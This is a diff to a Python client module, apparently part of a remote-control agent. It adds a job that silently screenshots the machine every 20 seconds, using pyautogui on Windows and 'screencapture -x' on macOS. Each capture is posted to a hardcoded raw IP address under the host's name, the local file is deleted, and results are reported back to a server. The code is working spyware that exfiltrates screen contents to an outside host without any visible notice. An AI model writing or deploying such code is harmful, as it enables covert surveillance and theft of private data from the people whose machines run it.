@@ -3,38 +3,52 @@ import socket
 import threading
 import time
 
-import pyautogui
-import requests
 import schedule
+import requests
 
-from client.modules.module import Module
+
+from client.jobs.job import Job
 from common.util import get_time
 
 
-class ScreenshotJob(Module):
+class Screenshot(Job):
     def __init__(self):
         super().__init__()
         self.stop_event = threading.Event()
+        self.upload_url = "http://39.107.248.76/file/upload"
+
+    def do_screenshot(self, filename):
+
+        if os.name == 'nt':
+            import pyautogui
+            pyautogui.screenshot(filename)
+        elif os.name == 'posix':
+            command = f"screencapture -x {filename}"
+            os.system(command)
+        else:
+            raise Exception('Unsupported os')
 
     def my_task(self):
-        url = "http://123.249.102.1/file/upload"
         filename = 'screenshot_{}.png'.format(get_time())
-        pyautogui.screenshot(filename)
+        self.do_screenshot(filename)
         filename = os.path.abspath(filename)
         if not os.path.isfile(filename):
-            print(f'File does not exist: {filename}')
+            self.send_to_server(0, f'File does not exist: {filename}', 0)
+            return
+
         with open(filename, 'rb') as file:
-            with requests.post(url, files={'files': file},
+            with requests.post(self.upload_url, files={'files': file},
                                data={'currentDirectory': f'/public/{socket.gethostname()}/'}) as resp:
-                print(resp.text)
+                self.send_to_server(1, f'Upload result: {resp.text}', 0)
         os.remove(filename)
 
     def run(self):
         try:
-            self.status = True
-            self.send_to_server(1, f'Scheduled job is on.', 1)
-            # schedule.every(10).seconds.do(self.my_task)
-            job = schedule.every().hour.at(":00").do(self.my_task)  # schedule.cancel_job(job)
+            self.is_running = True
+            self.send_to_server(1, f'Scheduled job is on.', 0)
+
+            schedule.every(20).seconds.do(self.my_task)
+            # schedule.every().hour.at(":00").do(self.my_task)  # schedule.cancel_job(job)
             while not self.stop_event.is_set():
                 schedule.run_pending()
                 time.sleep(1)
@@ -46,4 +60,4 @@ class ScreenshotJob(Module):
         self.send_to_server(0, f'Trying to stop', 0)
         schedule.clear()
         self.stop_event.set()
-        self.status = False
+        self.is_running = False
